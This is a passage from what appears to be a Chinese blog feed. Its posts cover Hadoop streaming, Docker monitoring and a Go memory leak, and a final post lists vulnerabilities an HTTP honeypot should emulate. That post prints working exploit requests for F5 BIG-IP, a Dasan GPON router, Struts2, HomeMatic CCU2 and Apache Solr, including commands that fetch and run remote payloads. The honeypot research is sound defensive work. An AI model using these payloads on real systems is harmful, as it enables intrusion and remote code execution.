title="map数量如何确定"></a>map数量如何确定</h3><p>map的个数等于split的个数。<br>其由三个因素决定：</p><ol><li>输入文件数目</li><li>输入文件大小</li><li>配置参数</li></ol><p>一般来说，对于每一个输入的文件会有一个map split。如果输入文件太大，会把大文件划分成多个split进行处理，每个map处理一个split。<br>涉及的参数：</p><ul><li><strong>mapreduce.input.fileinputformat.split.minsize</strong>：启动map最小的split size大小，默认0</li><li><strong>mapreduce.input.fileinputformat.split.maxsize</strong>：启动map最大的split size大小，默认256M</li><li><strong>dfs.block.size</strong>：block块大小。</li></ul><p>计算公式：<strong>splitSize =  Math.max(minSize, Math.min(maxSize, blockSize))</strong></p><p>FileInputFormat class 的getSplits()的伪代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num_splits &#x3D; 0</span><br><span class="line">for each input file f:</span><br><span class="line">    remaining &#x3D; f.length</span><br><span class="line">    while remaining &#x2F; split_size &gt; split_slope:</span><br><span class="line">        num_splits +&#x3D; 1</span><br><span class="line">        remaining -&#x3D; split_size</span><br><span class="line">    where:</span><br><span class="line">        split_slope &#x3D; 1.1 分割斜率</span><br><span class="line">        split_size &#x3D;~ dfs.blocksize 分割大小约等于hdfs块大小</span><br></pre></td></tr></table></figure><p>会有一个比例进行运算来进行切片，为了减少资源的浪费<br>例如一个文件大小为260M，在进行MapReduce运算时，会首先使用260M/128M(blocksize)，得出的结果和1.1进行比较，大于则切分出一个128M作为一个分片，剩余132M，再次除以128(blocksize)，得到结果为1.03，小于1.1则将132作为一个切片，即最终260M被切分为两个切片进行处理，而非3个切片。  </p><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><h4 id="sys-argv"><a href="#sys-argv" class="headerlink" title="sys.argv"></a>sys.argv</h4><p>mapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arg1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">arg2 = sys.argv[<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>hadoop straming：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -mapper <span class="string">&quot;mapper.py arg1 arg2&quot;</span> \</span><br><span class="line">    -file <span class="string">&quot;mapper.py&quot;</span></span><br></pre></td></tr></table></figure><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>mapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"></span><br><span class="line">date_start = os.environ.get(<span class="string">&quot;date_start&quot;</span>)</span><br></pre></td></tr></table></figure><p>hadoop straming：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -mapper <span class="string">&quot;mapper.py&quot;</span> \</span><br><span class="line">    -cmdenv <span class="string">&quot;date_start=<span class="variable">$date</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="设置多个输入目录"><a href="#设置多个输入目录" class="headerlink" title="设置多个输入目录"></a>设置多个输入目录</h3><h4 id="使用多个-input选项-or-逗号分割"><a href="#使用多个-input选项-or-逗号分割" class="headerlink" title="使用多个-input选项 or 逗号分割"></a>使用多个-input选项 or 逗号分割</h4><p>多个 -input：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir1&quot;</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir2&quot;</span></span><br></pre></td></tr></table></figure><p>逗号分割：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir1,/user/foo/dir2&quot;</span></span><br></pre></td></tr></table></figure><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir[1-2]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/&#123;dir1,dir2&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input_file=(<span class="string">&quot;/user/foo/dir1&quot;</span> <span class="string">&quot;/user/foo/dir2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="variable">$&#123;input_file[@]&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;配置参数&quot;&gt;&lt;a href=&quot;#配置参数&quot; class=&quot;headerlink&quot; title=&quot;配置参数&quot;&gt;&lt;/a&gt;配置参数&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;mapreduce.job.name&lt;/strong&gt;：job name。&lt;/li&gt;
&lt;li&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cadvisor+Prometheus+Grafana监控docker</title>
    <link href="http://woodpile27.cn/2020/09/16/docker-monitor/"/>
    <id>http://woodpile27.cn/2020/09/16/docker-monitor/</id>
    <published>2020-09-16T00:00:00.000Z</published>
    <updated>2020-09-16T04:10:37.214Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下使用Cadvisor+Prometheus+Grafana监控docker的搭建过程。<br>全部使用docker容器搭建，效果还不错。</p><h3 id="Cadvisor"><a href="#Cadvisor" class="headerlink" title="Cadvisor"></a>Cadvisor</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run    \                                      </span><br><span class="line">    --volume&#x3D;&#x2F;:&#x2F;rootfs:ro    \             </span><br><span class="line">    --volume&#x3D;&#x2F;var&#x2F;run:&#x2F;var&#x2F;run:rw    \                </span><br><span class="line">    --volume&#x3D;&#x2F;sys:&#x2F;sys:ro    \                         </span><br><span class="line">    --volume&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;:&#x2F;var&#x2F;lib&#x2F;docker:ro    \  </span><br><span class="line">    --publish&#x3D;8080:8080    \                          </span><br><span class="line">    --detach&#x3D;true    \                                </span><br><span class="line">    --name&#x3D;cadvisor    \                               </span><br><span class="line">    google&#x2F;cadvisor:latest</span><br></pre></td></tr></table></figure><h3 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a>Prometheus</h3><p>编辑/etc/prometheus/prometheus.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">global:</span><br><span class="line">  scrape_interval:     15s</span><br><span class="line">  evaluation_interval: 15s</span><br><span class="line"></span><br><span class="line">scrape_configs:</span><br><span class="line">  - job_name: &#39;docker&#39;</span><br><span class="line">    static_configs: </span><br><span class="line">    - targets: [&#39;192.168.1.152:8080&#39;]</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run    \ </span><br><span class="line">    -p 9090:9090 -d    \ </span><br><span class="line">    -v &#x2F;etc&#x2F;prometheus&#x2F;prometheus.yml:&#x2F;etc&#x2F;prometheus&#x2F;prometheus.yml    \ </span><br><span class="line">    --name prometheus    \  </span><br><span class="line">    prom&#x2F;prometheus</span><br></pre></td></tr></table></figure><p>启动后访问<code>http://ip:9090</code>Status中的Targets，确保job处于up状态。</p><h3 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h3><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run    \</span><br><span class="line">    --name grafana    \</span><br><span class="line">    -d -p 3000:3000    \ </span><br><span class="line">    grafana&#x2F;grafana</span><br></pre></td></tr></table></figure><p>启动后访问<code>http://ip:3000</code></p><ul><li>添加Data Sources：选择Prometheus， URL配置为<code>http://192.168.1.152:9090</code></li><li>导入dashboard：选择模板<code>https://grafana.com/dashboards/193</code>或<code>https://grafana.com/grafana/dashboards/10566</code>。import后可看到效果。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一下使用Cadvisor+Prometheus+Grafana监控docker的搭建过程。&lt;br&gt;全部使用docker容器搭建，效果还不错。&lt;/p&gt;
&lt;h3 id=&quot;Cadvisor&quot;&gt;&lt;a href=&quot;#Cadvisor&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Go应用内存泄漏问题的解决</title>
    <link href="http://woodpile27.cn/2020/09/15/go-memory-leak/"/>
    <id>http://woodpile27.cn/2020/09/15/go-memory-leak/</id>
    <published>2020-09-15T00:00:00.000Z</published>
    <updated>2020-09-15T10:24:31.748Z</updated>
    
    <content type="html"><![CDATA[<p>部署的一个Go语言写的程序出现内存占用逐渐上升的情况，排查了一段时间终于找到了原因。</p><h3 id="pprof"><a href="#pprof" class="headerlink" title="pprof"></a>pprof</h3><p>当出现内存占用不断上升的情况时，首先考虑是不是出现了内存泄露的问题。于是用pprof对程序进行持续的监控，从结果来看，goroutine的数量一直在一个稳定的范围内，排除goroutine泄漏的情况。<br>接着讲目光转移到inuse_space，然后看到了让我当时很疑惑的结果：<br><strong>pprof的结果与实际的内存占用结果出现了很大的差异</strong> ，pprof看到的内存占用只有个位数的MB，而无论是docker占用的内存亦或是在容器里top看到的内存占用都达到了上百兆。</p><p>在一番google之下找到了原因：<br>pprof看到的内存占用，其实只是golang逻辑上正在使用的内存量，不包括已被GC回收但尚未返还给操作系统的内存，同样也不包含内核态的内存占用，而top是站在操作系统层面看到的进程内存占用，理论上就是会比pprof看到的内存占用量更多。如果在工作中发现top看到占用的内存很大，而pprof看到的内存占用不多，有可能是两个问题导致的：</p><ul><li>有大量内存被GC但还没有来得及返还给操作系统</li><li>某些内核态操作（比如I/O）消耗了大量内存</li></ul><h3 id="byte导致的问题？"><a href="#byte导致的问题？" class="headerlink" title="[]byte导致的问题？"></a>[]byte导致的问题？</h3><p>我的程序在运行中会频繁的创建大量的[]byte，并且[]byte的长度也不小。而用pprof发现这部分代码占用的内存确实较多，猜测是不是这部分占用的内存被GC后没有及时反还给操作系统。<br>stackoverflow上有这样一个<a href="https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer">问题</a>：无法释放由bytes.Buffer占用的内存。高赞回答：</p><blockquote><p>Go是一种垃圾回收语言，这意味着当这些变量变得不可访问时，垃圾回收器会自动释放变量分配和使用的内存。释放的内存并不意味着将其返回给操作系统，释放的内存意味着可以回收该内存，并在需要时将其重新用于另一个变量。因此在操作系统中，不会仅由于某些变量变得不可访问而垃圾回收器检测到此变量并释放它所使用的内存就立刻看到内存减少。</p><p>但是如果Go运行一段时间（通常为5分钟）不使用，它将把内存返回给OS。如果在此期间内存使用量增加，则很有可能不会将内存返回给操作系统。如果等待一段时间而不重新分配内存，则释放的内存最终将返回给操作系统（不是所有内存，而是未使用的“大块”内存）。如果想迫不及待发生这种情况，可以调用debug.FreeOSMemory()强制执行。</p></blockquote><p>这篇<a href="https://blog.cloudflare.com/recycling-memory-buffers-in-go/">文章</a>同样指出了类似的问题，但是通过运行作者的示例程序发现HeapReleased也即回收到操作系统的内存，并非像作者描述的不会经常变化，相反其变化的非常快，也就是Go在不断在操作系统中回收内存。<br>原因应该是这两篇文章都已经年代久远，Go的更新迭代已经解决了上述问题。</p><h3 id="go-python"><a href="#go-python" class="headerlink" title="go-python"></a>go-python</h3><p>之后我又将目光转向go-python，程序中会不断通过go-python调用一个python脚本，而go-python是通过cgo调用libpython实现的。<br>问题是否出在这儿呢？首先我进行了验证，即注释掉了相关代码并且使CGO_ENABLED=0，测试结果发现程序没有出现之前的内存泄漏情况，于是终于找到了问题所在。<br>在go-python项目中有一个 <strong>memory leak</strong> 的issue吸引了我的注意：</p><blockquote><p>When to call GC？Do users need manual GC?</p></blockquote><blockquote><p>go-python is calling the CPython API through Cgo.<br>so you have to program as in C and follow the reference counting of the CPython API (calling python.Object.IncRef() and python.Object.DecRef().)</p><p>there’s no GC involved.<br><strong>you need to manually manage memory.</strong></p></blockquote><p>问题在于使用者需要手动管理内存，PyObject对象使用结束后需要主动调用 <strong>DecRef</strong> ，通过减少引用计数的方式释放，否则就会发生内存泄漏的情况。实测 <strong>DecRef</strong> 可能会引发某些问题，可以根据go-python文档的推荐改用 <strong>Clear</strong> 。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://segmentfault.com/a/1190000016412013">https://segmentfault.com/a/1190000016412013</a><br><a href="https://segmentfault.com/a/1190000019929993">https://segmentfault.com/a/1190000019929993</a><br><a href="https://github.com/wolfogre/go-pprof-practice/issues/1">https://github.com/wolfogre/go-pprof-practice/issues/1</a><br><a href="https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer/37383604#37383604">https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer/37383604#37383604</a><br><a href="https://stackoverflow.com/questions/45509538/freeing-unused-memory">https://stackoverflow.com/questions/45509538/freeing-unused-memory</a><br><a href="https://blog.cloudflare.com/recycling-memory-buffers-in-go/">https://blog.cloudflare.com/recycling-memory-buffers-in-go/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;部署的一个Go语言写的程序出现内存占用逐渐上升的情况，排查了一段时间终于找到了原因。&lt;/p&gt;
&lt;h3 id=&quot;pprof&quot;&gt;&lt;a href=&quot;#pprof&quot; class=&quot;headerlink&quot; title=&quot;pprof&quot;&gt;&lt;/a&gt;pprof&lt;/h3&gt;&lt;p&gt;当出现内存占用不</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HTTP蜜罐中需要模拟响应的漏洞&amp;服务</title>
    <link href="http://woodpile27.cn/2020/08/19/http-honeypot/"/>
    <id>http://woodpile27.cn/2020/08/19/http-honeypot/</id>
    <published>2020-08-19T11:37:10.000Z</published>
    <updated>2020-08-19T11:42:27.160Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution"><a href="#CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution" class="headerlink" title="CVE-2020-5902  - F5 BIG-IP Remote Code Execution"></a>CVE-2020-5902  - F5 BIG-IP Remote Code Execution</h3><h4 id="description"><a href="#description" class="headerlink" title="description"></a>description</h4><p>在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。未授权的远程攻击者通过向该页面发送特制的请求包，可以造成任意Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。<br>任意文件读取</p><ul><li><code>https://IP:8443/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=</code></li></ul><p>远程命令执行</p><ul><li><code>https://&#123;0&#125;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=</code></li></ul><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/zhzyker/exphub/tree/master/f5">https://github.com/zhzyker/exphub/tree/master/f5</a><br><a href="https://github.com/dunderhay/CVE-2020-5902/blob/master/CVE-2020-5902.py">https://github.com/dunderhay/CVE-2020-5902/blob/master/CVE-2020-5902.py</a></p><h3 id="Dasan-Networks-GPON-ONT-WiFi-Router-H640X-12-02-01121-2-77p1-1124-3-03p2-1146-Remote-Code-Execution"><a href="#Dasan-Networks-GPON-ONT-WiFi-Router-H640X-12-02-01121-2-77p1-1124-3-03p2-1146-Remote-Code-Execution" class="headerlink" title="Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146 - Remote Code Execution"></a>Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146 - Remote Code Execution</h3><h4 id="description-1"><a href="#description-1" class="headerlink" title="description"></a>description</h4><p>Dasan GPON ONT WiFi Router是韩国DASAN Networks公司的一款无线路由器设备。Dasan GPON ONT WiFi Router H640X 12.02-0112版本、2.77p1-1124版本和3.03p2-1146版本中存在缓冲区溢出漏洞。攻击者可通过向 <strong>/cgi-bin/login_action.cgi</strong> 文件中的‘login_action’函数发送较长的POST请求利用该漏洞执行任意代码。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/login_action.cgi</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.100:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: https://192.168.1.100:8080/cgi-bin/login.cgi</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 868</span><br><span class="line"></span><br><span class="line">action=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*Ԍ�CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC*�@;;;;;;;;;;;;;;;;;;;;;;;;wget http://1.1.1.1&amp;txtUserId=a&amp;button=Login&amp;txtPassword=a&amp;sle_Language=english</span><br></pre></td></tr></table></figure><h4 id="reference-1"><a href="#reference-1" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/44074">https://www.exploit-db.com/exploits/44074</a></p><h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><h4 id="description-2"><a href="#description-2" class="headerlink" title="description"></a>description</h4><p>CVE-2017-12149 - JBoss 5.x/6.x 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/invoker/readonly</strong> 请求中，服务器将用户提交的POST内容进行了Java反序列化。<br>直接将序列化数据作为POST body发送至/invoker/readonly即可</li></ul><p>CVE-2017-7504 - JBoss 4.x JBossMQ JMS 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/jbossmq-httpil/HTTPServerILServlet</strong> 中，直接把序列化数据POST。</li></ul><p>CVE-2015-7501 - JMXInvokerServlet 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/invoker/JMXInvokerServlet</strong> 中，与前一个类似。</li></ul><p>jmx-console 和 web-console</p><ul><li><strong>/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.system:type=ServerInfo</strong></li><li><strong>/web-console/ServerInfo.jsp</strong></li></ul><h4 id="reference-2"><a href="#reference-2" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/vulhub/vulhub/tree/master/jboss">https://github.com/vulhub/vulhub/tree/master/jboss</a><br><a href="https://www.exploit-db.com/exploits/36575">https://www.exploit-db.com/exploits/36575</a></p><h3 id="CVE-2018-11776-Apache-Struts2-S2-057"><a href="#CVE-2018-11776-Apache-Struts2-S2-057" class="headerlink" title="CVE-2018-11776 - Apache Struts2 S2-057"></a>CVE-2018-11776 - Apache Struts2 S2-057</h3><h4 id="description-3"><a href="#description-3" class="headerlink" title="description"></a>description</h4><p><a href="https://github.com/mazen160/struts-pwn_CVE-2018-11776">struts-pwn_CVE-2018-11776</a>使用数值计算的方式进行check。其首先生成一个随机数比如93，然后构造<code>$&#123;&#123;93*93&#125;&#125;</code> 替换url的一部分。</p><blockquote><p>以<code>http://example.com/demo/struts2-showcase/index.action</code>为例，会构造三个注入点依次测试：<br><code>http://example.com/$&#123;&#123;93*93&#125;&#125;/index.action</code><br><code>http://example.com/demo/$&#123;&#123;93*93&#125;&#125;/index.action</code><br><code>http://example.com/demo/struts2-showcase/$&#123;&#123;93*93&#125;&#125;/index.action</code></p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/$%7B%7B93*93%7D%7D/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)</span><br></pre></td></tr></table></figure><p>如果响应的Location字段返回了数值计算即93*93的结果则存在漏洞。根据注入点<br>构造payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&lt;----PAYLOAD----&gt;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)</span><br></pre></td></tr></table></figure><h4 id="reference-3"><a href="#reference-3" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/mazen160/struts-pwn_CVE-2018-11776">https://github.com/mazen160/struts-pwn_CVE-2018-11776</a></p><h3 id="HomeMatic-Zentrale-CCU2-RCE"><a href="#HomeMatic-Zentrale-CCU2-RCE" class="headerlink" title="HomeMatic Zentrale CCU2 RCE"></a>HomeMatic Zentrale CCU2 RCE</h3><h4 id="description-4"><a href="#description-4" class="headerlink" title="description"></a>description</h4><p>首先向 <strong>/api/backup/version.cgi</strong> 发送GET请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/backup/version.cgi</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Python-urllib/2.7</span><br></pre></td></tr></table></figure><p>如果返回了VERSION=x.x.x则继续发送payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/backup/logout.cgi?sid=aa&quot;);system.Exec(&quot;wget+-O+/tmp/exploit+http://127.0.0.1:1234/exploit&amp;&amp;chmod+%2bx+/tmp/exploit&quot;);system.ClearSessionID(&quot;bb</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: identity</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Python-urllib/2.7</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="reference-4"><a href="#reference-4" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/45052">https://www.exploit-db.com/exploits/45052</a></p><h3 id="CVE-2019-0192-amp-CVE-2019-0193-Apache-Solr-RCE"><a href="#CVE-2019-0192-amp-CVE-2019-0193-Apache-Solr-RCE" class="headerlink" title="CVE-2019-0192 &amp; CVE-2019-0193- Apache Solr RCE"></a>CVE-2019-0192 &amp; CVE-2019-0193- Apache Solr RCE</h3><h4 id="description-5"><a href="#description-5" class="headerlink" title="description"></a>description</h4><p>CVE-2019-0192</p><ol><li>GET请求 <strong>/solr/admin/cores?wt=json</strong> ，如果响应中包含 <strong>status</strong> 字段如{“status”:{“abcdefgh”:”1”},}，则存在cores节点</li><li>之后向 <strong>/solr/abcdefgh/config</strong> 发送POST请求。</li></ol><p>CVE-2019-0193</p><ol><li>GET请求 <strong>/solr/admin/cores</strong> ，跟上一个类似的是响应中包含 <strong>status</strong> 字段则存在cores节点。</li><li>GET请求 <strong>/solr/admin/info/system</strong> ，获取响应中 <strong>system</strong> 字段的 <strong>name</strong> 、 <strong>uname</strong> 和 <strong>version</strong> 。</li><li>POST请求 <strong>/solr/abcdefgh/config</strong> —— init node config。</li><li>GET请求<code>/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27&lt;-----command-----&gt;%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code>执行任意代码。</li></ol><h4 id="reference-5"><a href="#reference-5" class="headerlink" title="reference"></a>reference</h4><p><a 